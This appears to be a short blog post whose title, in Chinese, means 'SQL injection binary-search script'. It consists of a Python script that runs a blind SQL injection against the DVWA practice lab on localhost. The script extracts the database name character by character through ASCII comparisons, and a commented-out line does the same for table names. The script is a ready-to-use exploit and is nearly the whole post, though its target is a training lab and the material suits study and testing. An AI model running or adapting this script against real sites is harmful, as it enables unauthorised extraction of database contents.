---
title: "SQL注入二分法脚本"
author: ["4shen0ne"]
tags: ["sqli"]
draft: false
---

```python
ans = ""
for i in range(1, 100):
    bottom = 32
    top = 126
    mid = (bottom+top)//2
    while bottom < top:
        url = f"http://localhost/vulnerabilities/sqli_blind/?id=1'%20and%20ascii(substr(database()%2c{i}%2c1))%3e{mid}%20%23&Submit=Submit"
        # url = f"http://localhost/vulnerabilities/sqli_blind/?id=1'%20and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),{i},1))%3E{mid}%23&Submit=Submit"
        resp = requests.get(url, headers={"Cookie":"PHPSESSID=hpdj33o8l610t5nlhn316v41d3; security=low"}, proxies={"http":"http://localhost:8080"})
        if "User ID exists in the database." in resp.text:
            bottom = mid + 1
        else:
            top = mid
        mid = (bottom+top)//2
    if mid <= 32 or mid >= 126:
        break
    ans += chr(mid)
    print(f"result -> {ans}")
```
